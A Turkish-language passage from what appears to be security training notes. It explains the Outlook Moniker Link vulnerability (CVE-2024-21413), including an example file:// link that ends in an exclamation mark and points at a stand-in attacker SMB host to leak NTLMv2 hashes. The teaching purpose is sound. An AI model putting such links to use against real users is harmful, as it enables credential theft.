...
Phishing her zaman "sahte giriş sayfası" ya da "makrolu ek" değildir. Bazı saldırılar, kurbanın **parolasını girmesine bile gerek kalmadan** kimlik bilgisini sızdırır. Bunun öğretici bir örneği, Microsoft Outlook'taki **Moniker Link** zafiyetidir: CVE-2024-21413, Check Point Research'ten Haifei Li tarafından bulundu, 13 Şubat 2024 Patch Tuesday'de yamalandı, **CVSS 9.8 (Kritik)** (kaynaklar: [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-21413), [Check Point Research](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/)).

**Mekanizma:** Outlook normalde yerel/uzak dosyalara giden `file://` bağlantılarını "Protected View" (Korumalı Görünüm) ile bloke eder veya uyarı verir. Zafiyetin kökü, Outlook'un bağlantıları işlerken güvensiz bir Windows API'sini (`MkParseDisplayName`) çağırmasıdır; bağlantı hedefinin sonuna bir **ünlem işareti (`!`)** ve rastgele metin eklendiğinde (ör. `file:///\\saldirgan-sunucu\paylasim\dosya.rtf!x`) Outlook bunu bir COM "Moniker Link" olarak işler ve Protected View korumasını atlar. Sonuç: kurban e-postayı açtığında Outlook, saldırganın SMB sunucusuna (`\\saldirgan-sunucu`) otomatik bağlanır ve bu bağlantı sırasında kullanıcının **NTLMv2 kimlik doğrulama hash'ini** ([windows-temelleri.md](../02-linux-windows/windows-temelleri.md) SAM/NTLM) sunucuya sızdırır. (Aynı Moniker Link mekanizması, ikincil olarak uzaktan kod çalıştırmaya da (RCE) kapı aralar.)
